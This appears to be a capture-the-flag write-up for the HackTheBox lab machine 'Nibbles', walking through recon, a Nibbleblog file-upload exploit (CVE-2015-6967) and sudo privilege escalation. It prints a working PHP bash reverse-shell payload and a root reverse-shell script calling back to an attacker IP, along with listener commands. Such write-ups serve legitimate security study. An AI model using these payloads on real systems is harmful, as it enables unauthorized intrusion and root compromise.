# HackTheBox — Nibbles

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / File Upload  
**Status:** Retired  

---

## Summary

Nibbles is a Linux machine running a vulnerable instance of **Nibbleblog**, a PHP blogging platform. The path includes discovering a hidden web directory via source code inspection, brute-forcing weak credentials, exploiting an authenticated file upload vulnerability (CVE-2015-6967), and escalating privileges via a writable root-owned script in sudoers.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/nibbles 10.10.10.75
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

---

## Web Enumeration

### Visiting Port 80

The default Apache page loads. Checking the source reveals:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Navigating to `http://10.10.10.75/nibbleblog/` confirms a Nibbleblog installation.

### Directory Brute-Force

```bash
gobuster dir -u http://10.10.10.75/nibbleblog/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

Key findings:
- `/admin.php` — Admin login panel
- `/content/` — Writable content directory
- `/README` — Reveals **Nibbleblog version 4.0.3**

---

## Exploitation

### Default Credentials

Trying `admin:nibbles` at `/admin.php` — **success**.

> Note: Nibbleblog has a brute-force protection that blacklists IPs after failed attempts. Avoid aggressive brute-forcing.

### CVE-2015-6967 — File Upload RCE

Nibbleblog 4.0.3 allows authenticated admins to upload PHP files via the **"My image" plugin**, bypassing extension checks.

1. Navigate to: `Plugins → My image → Configure`
2. Upload a PHP reverse shell (e.g., from PentestMonkey):

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'"); ?>
```

3. Start listener:

```bash
nc -lvnp 4444
```

4. Trigger the shell:

```
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

Shell lands as **nibbler**.

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

### Exploit Writable Script

The path doesn't exist yet — create it:

```bash
mkdir -p /home/nibbler/personal/stuff
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i >& /dev/tcp/10.10.14.X/5555 0>&1' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

Start a second listener:

```bash
nc -lvnp 5555
```

Execute via sudo:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Root shell obtained.**

---

## Flags

```bash
# User
cat /home/nibbler/user.txt

# Root
cat /root/root.txt
```

---

## Key Takeaways

- Always **view page source** — hidden comments often reveal paths
- Check `README` files in web apps to identify exact version numbers
- Authenticated file upload = RCE in many older CMS platforms
- `sudo -l` is always one of the first privesc checks — especially watch for writable scripts with NOPASSWD
- Creating non-existent paths in sudoers entries is a powerful escalation vector

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web directory brute-force |
| PentestMonkey PHP Shell | Reverse shell payload |
| netcat | Listener |
